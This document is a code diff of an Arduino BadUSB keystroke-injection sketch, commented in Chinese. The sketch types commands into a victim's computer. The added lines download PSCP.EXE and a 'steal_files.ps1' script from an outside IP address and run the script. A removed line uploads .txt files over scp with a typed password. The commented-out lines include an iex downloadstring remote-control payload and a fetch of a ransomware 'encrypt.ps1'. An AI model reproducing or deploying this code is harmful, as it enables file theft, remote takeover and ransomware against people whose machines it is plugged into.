@@ -16,28 +16,33 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(2000);
-  //文件窃取
-  Keyboard.print("scp d:/test/*.");
-  Keyboard.print("txt badusb@118.178.229.36:/badusb/uploads");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(3500);
-  Keyboard.println("ljjyyds");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
+
   //先进入D盘文件夹
-//  Keyboard.println("d:");
-//  Keyboard.press(KEY_RETURN);
-//  Keyboard.release(KEY_RETURN);
-//  delay(1000);
-//  Keyboard.println("mkdir 1TEST");
-//  Keyboard.press(KEY_RETURN);
-//  Keyboard.release(KEY_RETURN);
-//  delay(1000);
-//  Keyboard.println("cd 1TEST");
-//  Keyboard.press(KEY_RETURN);
-//  Keyboard.release(KEY_RETURN);
-//  delay(1000);
+  Keyboard.println("d:");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(1000);
+  Keyboard.println("mkdir hacker");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(1000);
+  Keyboard.println("cd hacker");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(1000);
+
+  //下载上传工具
+  Keyboard.println("Invoke-WebRequest -Uri 'HTTP://118.178.229.36:9888/UPLOADS/PSCP.EXE' -OutFile 'PSCP.EXE'");
+  delay(5000);
+  //文件窃取脚本：支持上传二级目录文件
+  Keyboard.println("Invoke-WebRequest -Uri 'HTTP://118.178.229.36:9888/UPLOADS/steal_files.ps1' -OutFile 'steal_files.ps1'");
+  delay(5000);
+  Keyboard.println(".\\steal_files.ps1");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(10000);
+  
+
   //远程主控：将下载的payload.txt后缀改为ps1，并运行payload.ps1
 //  //Keyboard.println("iex(new-object net.webclient).downloadstring('http://118.178.229.36:9888/uploads/payload.ps1')");
   //下载文件
@@ -55,6 +60,8 @@ void setup() {
 //  Keyboard.press(KEY_RETURN);
 //  Keyboard.release(KEY_RETURN);
 //  delay(3000);
+
+
   //实现文件加密：勒索
 //  Keyboard.println("Invoke-WebRequest -Uri 'http://118.178.229.36:9888/uploads/encrypt.ps1' -OutFile 'encrypt.ps1'");
 //  Keyboard.press(KEY_RETURN);
